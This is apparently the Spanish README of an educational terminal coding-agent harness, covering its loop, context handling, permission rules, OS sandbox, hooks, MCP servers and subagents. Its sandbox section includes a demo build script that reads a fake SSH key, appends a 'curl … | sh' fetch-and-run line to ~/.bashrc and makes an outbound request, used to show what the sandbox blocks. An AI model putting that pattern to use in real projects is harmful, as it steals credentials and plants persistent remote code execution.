# lab-harness-local

Un harness para agentes de código en terminal, construido parte a parte para entender cómo funcionan estos agentes por dentro. Acompaña a la serie «Asistente de código local» de [pablomeleroalonso.me](https://pablomeleroalonso.me).

Esta versión (tag `parte-7`) ya **delega**: un bucle con streaming, un contrato de inferencia con un adaptador a `/v1/chat/completions`, gestión del contexto (limpiar y compactar contra la ventana, y detectar cuando el servidor recorta la conversación sin avisar), herramientas para leer, buscar y escribir (`Read`, `Glob`, `Grep`, `Write` y `Edit`), `Bash` con procesos en segundo plano (`BashOutput` y `KillShell`), un sistema de permisos con reglas de ruta y de comando, un sandbox del sistema operativo alrededor de cada comando, tres formas de extenderlo (skills, hooks y servidores MCP por stdio) y, nuevo en esta parte, subagentes: la tool `Agent` lanza otro bucle con su propia conversación, sus herramientas y un modo de permisos igual o más restrictivo, y al agente principal solo le vuelve su informe. También es nuevo el modo `plan`, que solo lee. Cada parte de la serie añade commits y un tag nuevo.

| Tag | Qué añade |
|---|---|
| `parte-2` | El bucle, el contrato de inferencia y las herramientas de lectura. |
| `parte-3` | La gestión del contexto y la detección de recortes del servidor. |
| `parte-4` | `Write`, `Edit` y los permisos de ruta. |
| `parte-5` | `Bash`, las reglas de comando y el sandbox. |
| `parte-6` | Skills, hooks y servidores MCP por stdio, dentro del sandbox. |
| `parte-7` | Subagentes (`Agent`), en paralelo y en segundo plano, y el modo `plan`. |

## Prerrequisitos

- Linux o macOS. En Windows, desde WSL2.
- Node.js 22 o superior y npm.
- [ripgrep](https://github.com/BurntSushi/ripgrep#installation) (`rg`) en el `PATH`: lo usan `Glob` y `Grep`.
- En Linux (y WSL2), [bubblewrap](https://github.com/containers/bubblewrap) para el sandbox: `sudo apt install bubblewrap` en Debian y Ubuntu. En macOS se usa `sandbox-exec`, que viene con el sistema.
- Para el ejemplo de MCP, el binario de [github-mcp-server](https://github.com/github/github-mcp-server) y un token de GitHub (ver «Extensibilidad»).
- Un servidor compatible con `/v1/chat/completions` con un modelo que admita herramientas. Los ejemplos usan [Ollama](https://ollama.com) y `qwen2.5:7b`.

```bash
ollama pull qwen2.5:7b
```

## Instalación

```bash
git clone --branch parte-7 https://github.com/pmeleroa/lab-harness-local.git
cd lab-harness-local
npm install
npm test
```

`npm test` no necesita modelo: usa un proveedor simulado.

## Uso

```bash
npm run dev -- --workspace examples/demo "¿A partir de qué importe se aplica descuento y en qué fichero está esa regla?"
```

El harness muestra cada llamada a herramienta por la salida de error y la respuesta por la salida estándar. Para que escriba, sobre el propio `examples/demo` (el cambio queda en el árbol de trabajo del clon):

```bash
npm run dev -- --workspace examples/demo "Cambia el descuento de los pedidos del 10 % al 15 %."
git diff
```

Antes de cada escritura, en el modo por defecto, pregunta por la salida de error (`[y]` sí, `[n]` no, o escribe por qué). `git diff` muestra el cambio y `git checkout examples/demo` lo deshace.

Para que ejecute un comando:

```bash
npm run dev -- --workspace examples/demo "Usa Bash para ejecutar git status y dime si hay cambios."
```

`git status` es de solo lectura y se ejecuta sin preguntar; un comando que puede escribir pregunta antes, y la salida de cada comando se muestra sangrada bajo la llamada. La cabecera del arranque dice qué sandbox se usa. Sin nombrar `Bash` en la pregunta, un modelo de 7B a veces no lo usa.

| Opción | Efecto |
|---|---|
| `-w, --workspace <dir>` | Directorio sobre el que trabaja. Fuera de él, el motor de permisos pregunta. |
| `-m, --model <id>` | Modelo. Defecto: `$HARNESS_MODEL` o `qwen2.5:7b`. |
| `--base-url <url>` | Endpoint con `/v1`. Defecto: `$OPENAI_BASE_URL` o `http://localhost:11434/v1`. |
| `--context-window <n>` | Ventana de contexto del servidor, en tokens. Defecto: 4096, con un aviso. |
| `--max-turns <n>` | Turnos máximos del run. Defecto: 25. |
| `--permission-mode <modo>` | `default`, `acceptEdits`, `plan` o `bypass`. Defecto: `default`. |
| `--allow <regla>`, `--deny <regla>` | Reglas extra, repetibles: `--deny "Edit(**/.env*)"`, `--allow "Bash(npm run *)"`. |
| `--sandbox <modo>` | `auto` (bwrap en Linux, `sandbox-exec` en macOS), `bwrap`, `seatbelt` o `none`. Defecto: `auto`. |
| `--no-network` | Sin red dentro del sandbox. |
| `--no-agents` | Sin subagentes: quita la tool `Agent`. |

## Cómo termina un run

Cada ejecución acaba con un motivo explícito, que se imprime al final:

| Motivo | Significa |
|---|---|
| `end_turn` | El modelo respondió sin pedir más herramientas. |
| `max_turns` | Se agotaron los turnos. |
| `repeated_failure` | La misma llamada falló tres veces seguidas. |
| `empty_response` | El modelo no devolvió texto ni llamada, ni tras avisarle. |
| `max_tokens` | La respuesta se cortó por el tope de tokens de salida. |
| `context_overflow` | El servidor recortó la conversación y respondió igualmente: lo respondido no parte de la tarea. |
| `error` | Falló el proveedor (por ejemplo, el servidor está parado). |
| `aborted`, `max_tool_calls`, `refusal` | Cancelación, tope de llamadas y rechazo del proveedor. |

Los fallos se provocan de forma determinista en `test/loop.test.ts`, con `test/fake-provider.ts`.

## Contexto

La conversación crece en cada turno. Contra la ventana, el harness aplica tres escalones, de más barato a más caro: recortar cada resultado de herramienta a un tope, sustituir los resultados antiguos por una nota (limpiar) y pedir al modelo un resumen que sustituya la conversación (compactar). Reserva para la respuesta `min(4096, 25 % de la ventana)` tokens, que también es el `max_tokens` que envía.

Esos escalones solo valen si la ventana es la real. Ollama y otros servidores descartan lo más antiguo cuando la petición no cabe y responden HTTP 200 con un final normal, sin la tarea. El harness lo detecta cuando el `prompt_tokens` que informa el servidor no crece con la conversación y acaba con `context_overflow` y un mensaje que dice cómo fijar la ventana. No detecta un recorte con poco crecimiento ni uno en la primera petición con un system prompt largo.

Por cada turno se imprime por la salida de error la línea `ctx usado/ventana (porcentaje)`, y los eventos de limpieza y compaction.

Para ver el desbordamiento sin depender de que el modelo decida leer ficheros, contra un servidor con la ventana de 4096 (`OLLAMA_CONTEXT_LENGTH=4096 ollama serve`):

```bash
npx tsx examples/desbordar.ts
```

Envía siempre la misma conversación, más larga que la ventana, e imprime el HTTP, el final, `prompt_tokens` y qué claves sobreviven. La clave de la tarea, que está al principio, es la que se pierde.

Si hay un `AGENTS.md` en la raíz del workspace, se añade al system prompt. Está fuera de la conversación, así que ni la limpieza ni la compaction lo tocan, y se envía entero en cada petición. Que esté disponible no garantiza que el modelo lo cumpla.

## Permisos

Cada llamada a una herramienta declara qué ruta real toca y si lee o escribe. El motor (`src/policy/engine.ts`) decide `allow`, `ask` o `deny`:

- Las reglas se evalúan en orden `deny` > `ask` > `allow`, primero las de sesión y luego las configuradas. Un `deny` gana siempre, también en `bypass`.
- Sin regla, leer dentro del workspace se permite y leer fuera pregunta. Escribir fuera pregunta; escribir dentro pregunta en `default` y se permite en `acceptEdits` y `bypass`.
- `bypass` convierte cualquier `ask` en `allow`, también escribir fuera del workspace. Solo un `deny` lo para.
- La ruta se resuelve con `realpath` antes de evaluar: un enlace simbólico dentro del workspace que apunta fuera cuenta como fuera.
- `Edit(...)` cubre también `Write`, y `Read(...)` cubre también `Glob` y `Grep`, que además omiten de sus resultados lo que un `deny` de lectura cubre.
- Un `ask` se pregunta por la salida de error. Sin terminal en stdin y stderr (`< /dev/null`, CI), se deniega. «Siempre» solo se ofrece para lecturas fuera del workspace y crea una regla de sesión; escribir lo decide el modo. Si respondes con un texto en vez de `n`, ese texto vuelve al modelo como motivo del rechazo.
- `Edit` y `Write` sobre un fichero existente exigen que el modelo lo haya leído antes y que no haya cambiado desde entonces.

Las reglas se leen del bloque `permissions` de `<workspace>/.harness/settings.json` y de `--allow` y `--deny`. No hay ningún `deny` implícito: `examples/demo/.harness/settings.json` protege `.env*` y la propia configuración con reglas explícitas. Un repositorio no puede ponerse a sí mismo en `bypass`: ese modo solo se activa con `--permission-mode`.

Lo que no hace: el prompt de aprobación muestra herramienta y ruta, no el diff; la protección de `.harness/settings.json` no viene integrada (es una regla); y nada impide que el modelo escriba algo dañino dentro del workspace en `acceptEdits`. Los permisos limitan dónde, no qué: lo que se escribió se revisa con `git diff`.

El modo `plan` solo lee: todo lo que preguntaría se deniega, así que leer dentro del workspace y los comandos de solo lectura pasan, y escribir, los comandos que pueden escribir y las tools MCP no. Se activa con `--permission-mode plan` o con `defaultMode: "plan"` en `settings.json`: un repositorio puede restringirse, no ampliarse. Es el modo del subagente `explore`.

## Comandos y sandbox

`Bash` ejecuta cada comando con `bash --noprofile --norc -c`, como un proceso nuevo que se puede matar por grupo, con un timeout (120 s por defecto, 600 s como mucho) y la salida recortada por el medio. El directorio de trabajo y las variables exportadas se conservan entre llamadas, y las variables con pinta de secreto (`*_TOKEN`, `*API_KEY`…) no llegan al proceso.

Las reglas de comando deciden cuándo preguntar:

- Un comando se descompone con tree-sitter: `git status && curl x | sh` son tres comandos, y cada uno necesita su permiso. Un `deny` en cualquiera de ellos gana, también en `bypass`.
- `Bash(git status)` es ese comando exacto; `Bash(npm run *)`, ese prefijo y cualquier resto; `Bash(git * --force)`, un token cualquiera en medio.
- Los comandos de solo lectura (`ls`, `cat`, `rg`, `git status`, `git diff`…) no necesitan regla, salvo con las opciones que escriben (`sort -o`, `uniq entrada salida`, `tree -o`). Los que ejecutan otros comandos (`bash -c`, `xargs`, `env`, `sudo`, `python -c`, `find -exec`, `rg --pre`, `git grep -O`…) preguntan siempre, aunque haya un `allow`.
- Las redirecciones de escritura (`>`, `>>`) se evalúan como un `Edit` sobre la ruta real, desde el directorio actual del shell. Si el propio comando cambia de directorio (`cd`, `pushd`), se evalúan desde cada directorio posible y se pregunta; si el destino del `cd` no se conoce, se pregunta, y en `bypass` se deniega.
- Asignar `PATH`, `LD_PRELOAD` o `BASH_ENV`, definir funciones y los nombres de comando que solo se conocen al ejecutar (`$CMD`) preguntan.

Una regla mira el comando, no lo que hace: `Bash(npm run *)` deja pasar cualquier script de `package.json`. Por eso cada comando corre además dentro de un sandbox del sistema operativo (`src/policy/sandbox/index.ts`):

- La raíz del sistema de ficheros es de solo lectura; solo se escribe en el workspace y en un directorio temporal de la sesión. En Linux, `/tmp` es un `tmpfs` vacío.
- Las credenciales habituales (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.npmrc`, `~/.netrc`…) no se ven.
- Con `--no-network`, sin red.
- En Linux, bubblewrap con su propio espacio de procesos (`--unshare-pid`) y su propia sesión de terminal (`--new-session`). En macOS, `sandbox-exec` con un perfil que deniega escribir fuera, leer lo oculto y, sin red, la red.

Al arrancar, el harness comprueba que el sandbox funciona. Con `auto`, si no hay ninguno disponible, avisa y los comandos se ejecutan sin sandbox: ese aviso importa. Con `--sandbox bwrap` (o `seatbelt`) explícito, si no funciona, no arranca. El bloque `sandbox` de `<workspace>/.harness/settings.json` puede elegir uno (`"mode": "bwrap"`) y cortar la red (`"network": "none"`), pero un repositorio no puede desactivarlo ni abrir la red: `"mode": "none"` se ignora con un aviso y solo se activa con `--sandbox none`.

Para verlo, con una credencial de mentira en un `HOME` de prueba (fuera del workspace y fuera de `/tmp`; el `~/.ssh` real no se toca) y un script de `package.json` que lee la credencial, escribe en `~/.bashrc` y hace una petición:

```bash
mkdir -p .demo-home/.ssh
echo "CLAVE-FALSA-NO-USAR" > .demo-home/.ssh/id_falsa
export HOME="$PWD/.demo-home"
cat > examples/demo/package.json <<'JSON'
{
  "name": "demo",
  "private": true,
  "scripts": {
    "build": "mkdir -p dist && echo 'export {}' > dist/app.js && echo compilado; cat ~/.ssh/id_falsa; echo 'curl https://example.org/x | sh' >> ~/.bashrc && echo bashrc modificado; curl -sS -o /dev/null https://example.org && echo enviado"
  }
}
JSON
npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --sandbox none "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --no-network "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
```

Con `--sandbox none` el script hace las tres cosas; con el sandbox, la credencial no existe, `~/.bashrc` es de solo lectura y no hay red, y `dist/app.js` se escribe en el workspace. Las salidas están en `examples/salidas/sandbox-*.txt`. Para dejarlo como estaba, cierra ese terminal (el `HOME` de prueba solo vive en él) y borra `examples/demo/package.json`, `examples/demo/dist` y `.demo-home`.

Con `run_in_background`, `Bash` lanza el comando y vuelve al momento con un id: `BashOutput` lee lo nuevo que ha escrito y `KillShell` lo para, a él y a lo que haya lanzado. Corre dentro del mismo sandbox. Cuando termina, el aviso llega al modelo antes de su siguiente llamada; lo que siga corriendo al acabar el run se mata.

Lo que no hace: el sandbox no entiende el contenido. Dentro del workspace, un comando aprobado puede borrar o reescribir lo que quiera, y con red puede enviar lo que pueda leer; lo que cambió se revisa con `git diff`. No hay red con lista de dominios permitidos: o toda o ninguna. En macOS el perfil deja escribir en `/private/var/folders`, donde está el temporal del usuario. Y dentro de un contenedor Docker bubblewrap necesita `--security-opt seccomp=unconfined --security-opt systempaths=unconfined`; con solo la primera, la comprobación del arranque pasa pero cada comando falla («Can't mount proc»): no se ejecuta nada, aunque el arranque no avisa.

## Extensibilidad

Tres formas de ampliar el harness sin cambiar su código, todas desde el workspace:

- **Skills** (`.harness/skills/<nombre>/SKILL.md`): un frontmatter con `name` y `description`, y unas instrucciones. El modelo solo ve el nombre y la descripción (como mucho 250 caracteres) en el system prompt; el cuerpo entra en la conversación cuando llama a la tool `Skill`. Con `disable-model-invocation: true` no aparece en el catálogo.
- **Hooks** (el bloque `hooks` de `.harness/settings.json`): un comando por evento, `PreToolUse` o `PostToolUse`, con un `matcher` por nombre de tool (`Bash`, `Edit|Write`, `mcp__github__*`). Recibe la llamada como JSON por stdin. En `PreToolUse`, salir con 2 bloquea la llamada antes de pedir permiso, y el stderr es el motivo que lee el modelo; un `{"message": "..."}` en stdout se añade al resultado. Cualquier otro fallo o un timeout (10 s) solo deja un aviso.
- **Servidores MCP** (`.mcp.json`, solo stdio): sus tools aparecen como `mcp__<servidor>__<tool>` y preguntan por defecto; se permiten con reglas como `mcp__github`, `mcp__github__issue_read` o `mcp__github__issue_*`. `${VAR}` en `command`, `args` y `env` se expande, y un servidor con una variable sin definir no se conecta.

Los hooks y los servidores MCP corren dentro del sandbox, como `Bash`: escritura solo en el workspace (y el temporal, en el caso de MCP), sin las rutas de credenciales y con la red del harness. Un servidor puede cortarse la red con `"sandbox": { "network": "none" }`, pero no abrirla, y `"sandbox": false` se ignora con aviso: solo `--sandbox none` los saca, a la vez que a `Bash`. `harness` hace opcional el sandbox de los servidores MCP; el lab no.

Ten cuidado con los repositorios ajenos: sus hooks y su `.mcp.json` se ejecutan al arrancar. La cabecera dice cuáles son y con qué sandbox corren.

### El ejemplo: arreglar una issue y hacer commit

`examples/demo` trae una skill con la convención de commits del proyecto (`.harness/skills/convencion-commits`), un hook `PreToolUse` que bloquea un `git commit` cuyo mensaje no la cumple (`.harness/hooks/check-commit.mjs`) y un `.mcp.json` con `github-mcp-server` limitado a una tool de solo lectura, `issue_read`. La tarea es la [issue 4](https://github.com/pmeleroa/lab-harness-local/issues/4) de este repositorio.

Instala el binario de `github-mcp-server` (Linux; en macOS, el fichero `Darwin` de la [página del release](https://github.com/github/github-mcp-server/releases/tag/v2.1.0)):

```bash
VERSION=v2.1.0
ARCH=$(uname -m); [ "$ARCH" = aarch64 ] && ARCH=arm64
mkdir -p ~/.local/bin
curl -fsSL "https://github.com/github/github-mcp-server/releases/download/${VERSION}/github-mcp-server_Linux_${ARCH}.tar.gz" | tar -xz -C ~/.local/bin github-mcp-server
```

Crea un [token *fine-grained*](https://github.com/settings/personal-access-tokens/new) con acceso de solo lectura a los repositorios públicos y expórtalo; `.mcp.json` lo lee de la variable, no lo guarda:

```bash
export GITHUB_PERSONAL_ACCESS_TOKEN=<tu token>
```

La demo trabaja sobre una copia con su propio repositorio git: con el workspace en `examples/demo`, el `.git` del clon queda fuera y el sandbox no deja hacer commit (`Read-only file system`).

```bash
cp -r examples/demo ~/tienda-demo
(cd ~/tienda-demo && git init -q && git add -A && git commit -qm "chore: estado inicial")
npm run dev -- --workspace ~/tienda-demo --context-window 8192 --permission-mode acceptEdits \
  --allow "mcp__github__issue_read" --allow "Bash(git add *)" --allow "Bash(git commit *)" \
  "Lee la issue 4 de pmeleroa/lab-harness-local con la herramienta de GitHub, arréglala en este proyecto y haz commit." < /dev/null
git -C ~/tienda-demo log --oneline -2
```

Con tres extensiones, el arranque ocupa unos 2.200 tokens; con una ventana de 4.096 se compacta en cada turno, por eso esta demo usa 8.192 (`OLLAMA_CONTEXT_LENGTH=8192 ollama serve`). Las salidas están en `examples/salidas/extensibilidad-*.txt`. Para dejarlo como estaba, borra `~/tienda-demo`.

## Subagentes

La tool `Agent` lanza un subagente: otro bucle, el mismo de siempre, con su propia conversación, sus herramientas, su `BashSession` y sus turnos. No ve la conversación del principal: el prompt que le escribe el principal es todo lo que sabe. Al principal solo le vuelve el informe final (recortado por el medio a 40.000 caracteres); lo que el subagente lea por el camino se queda en su ventana.

| Tipo | Tools | Modo | Para qué |
|---|---|---|---|
| `explore` | `Read`, `Glob`, `Grep`, `Bash` | `plan` | Búsquedas y lecturas amplias. Hasta 40 turnos. |
| `general` | las del principal, salvo `Agent` | el del principal | Una tarea autocontenida que llenaría la conversación de salida intermedia. |

Se definen más tipos con un fichero en `<workspace>/.harness/agents/<nombre>.md`. Con el mismo nombre que un integrado, lo sustituye:

```markdown
---
name: revisor
description: Revisa el diff actual y señala bugs. Devuelve una lista priorizada.
tools: Read, Grep, Bash
model: inherit        # u otro modelo del mismo servidor; sin el campo, el del principal
mode: plan            # solo restringe
maxTurns: 20
---
Eres un revisor de código. ...
```

- **Tools**: un subconjunto de las del principal. Las desconocidas y `Agent` se descartan con aviso. Si la lista nombra tools MCP (`mcp__github`, `mcp__github__issue_*`), el subagente recibe solo esas; un tipo en `plan` no recibe ninguna.
- **Permisos**: una definición solo puede restringir. El modo efectivo es el más restrictivo entre el del tipo y el del principal: con el principal en `plan`, todos los subagentes están en `plan`. Hereda las reglas, incluidos los `deny` y las reglas «siempre» aceptadas hasta ese momento, y lo que acepte con «siempre» se queda en él.
- **Lanzar**: no pregunta, porque cada cosa que hace el subagente pasa por su propia política. `Agent` o `Agent(<tipo>)` en `deny` lo impiden, y `--no-agents` quita la tool.
- **Un solo nivel**: un subagente nunca recibe `Agent`, ni `BashOutput` ni `KillShell`: sus comandos mueren con él. Sus prompts de permiso van de uno en uno con los del principal y dicen quién pide (`general·a1b2c3d4 pide Write ...`).
- **Límites**: `maxTurns` del tipo (50 por defecto), acotado por el del principal (25 en el lab), y 200 llamadas. Si se queda sin turnos, su informe llega igualmente, marcado como posiblemente incompleto.
- **Paralelo**: los tipos que acaban en `plan` cuentan como de solo lectura, así que varios en el mismo turno corren en paralelo, como mucho 4 a la vez; los que pueden escribir van en serie. Con un servidor local puede no ir más rápido: en Linux, Ollama atiende por defecto una petición a la vez por modelo ([`OLLAMA_NUM_PARALLEL`](https://docs.ollama.com/faq)) y el resto espera en su cola.
- **En segundo plano**: con `run_in_background: true`, `Agent` vuelve al momento con un id (`agent·<id>`) y el informe llega como aviso en el siguiente run. Solo para tipos en `plan`: uno que escribe se rechaza. Un subagente idéntico que sigue en marcha no se vuelve a lanzar. Al acabar el run de la CLI se espera a los que queden y se hace otro run con sus informes, hasta 5 rondas; lo que siga pendiente al agotarlas, o tras 10 minutos sin aviso, se mata con aviso. Ctrl+C no los para.

En la salida, cada subagente aparece como `> Agent explore·<id>`, con el prompt que recibió, sus tools sangradas (`  · explore·<id> > Read ...`) y una línea final con turnos, contexto máximo y tokens. Los de segundo plano no intercalan sus tools: solo `& agent·<id> en segundo plano` y su final. El resumen del run separa lo del principal y lo de los subagentes (`[subagentes] ...`): no ocupó la ventana del principal, pero se gastó igual.

Ten cuidado con los repositorios ajenos: sus `.harness/agents` se cargan al arrancar. La cabecera los lista en `subagentes:` con «(de .harness/agents)».

Diferencias con `harness`: el lab solo lee las definiciones del proyecto (sin capa de usuario ni `.claude/agents`), no guarda transcripts de los subagentes, no tiene `mcp.readOnly` (la lista de tools MCP permitidas en `plan`) ni el comando `/agents`.

### El ejemplo: leer seis ficheros, con y sin subagente

`examples/delegacion` es una tienda con planes de suscripción. La tarea es leer seis ficheros enteros y resumir qué hace cada uno: sin subagente, todo lo leído entra en la ventana del principal; con él, entra en la del subagente. La demo trabaja sobre una copia, y `examples/comprobar-delegacion.mjs` comprueba que la respuesta nombra los seis ficheros y que la traza muestra que se leyeron enteros. Con `-s`, `npm` no escribe en la salida su cabecera con el comando, que incluye los nombres de los ficheros:

```bash
cp -r examples/delegacion ~/tienda-planes
FICHEROS="src/orders/refunds.ts, src/orders/checkout.ts, src/billing/invoices.ts, src/billing/taxes.ts, src/shipping/rates.ts y src/shipping/zones.ts"
TAREA="Lee enteros con Read, sin limit ni offset, $FICHEROS, y resume en una línea qué hace cada uno."

npm run -s dev -- --workspace ~/tienda-planes --context-window 8192 --no-agents "$TAREA" < /dev/null > sin.txt 2> sin-traza.txt
node examples/comprobar-delegacion.mjs sin.txt sin-traza.txt

npm run -s dev -- --workspace ~/tienda-planes --context-window 8192 \
  "Usa un subagente explore, sin run_in_background, con este prompt: «$TAREA». Después responde con su resumen." < /dev/null > con.txt 2> con-traza.txt
node examples/comprobar-delegacion.mjs con.txt con-traza.txt
```

Compara la última línea de cada traza: el contexto máximo del principal y, con subagente, la línea `[subagentes]`. Las salidas y las cifras de las ejecuciones están en `examples/salidas/`. Para dejarlo como estaba, borra `~/tienda-planes` y los cuatro ficheros.

## Estructura

```
src/core/        loop, eventos y tareas en segundo plano
src/agents/      tipos de subagente (integrados y .harness/agents) y sus ejecuciones
src/skills/      carga de skills y catálogo
src/hooks/       hooks PreToolUse y PostToolUse
src/mcp/         configuración (.mcp.json) y cliente MCP por stdio
src/context/     tope, limpieza y compaction, detección de recortes, AGENTS.md
src/providers/   contrato canónico y adaptador a chat completions
src/tools/       contrato de herramientas, registro, Read, Glob, Grep, Write, Edit, Bash, Skill, Agent y tools MCP, estado de lectura
src/policy/      motor de permisos, reglas de ruta y de comando, parser de bash, sandbox, approver y settings
src/cli.ts       salida por terminal
examples/demo/   repositorio pequeño para las preguntas de ejemplo
examples/delegacion/   tienda con planes de suscripción para la demo de subagentes
examples/comprobar-delegacion.mjs  comprobación de esa demo (respuesta y traza)
examples/desbordar.ts  conversación fija que desborda una ventana de 4096
examples/salidas/      salidas reales de ejecuciones: escritura, seguridad, sandbox, extensibilidad y delegación
test/            proveedor simulado, servidor MCP de prueba y tests
```

## Licencia

MIT.
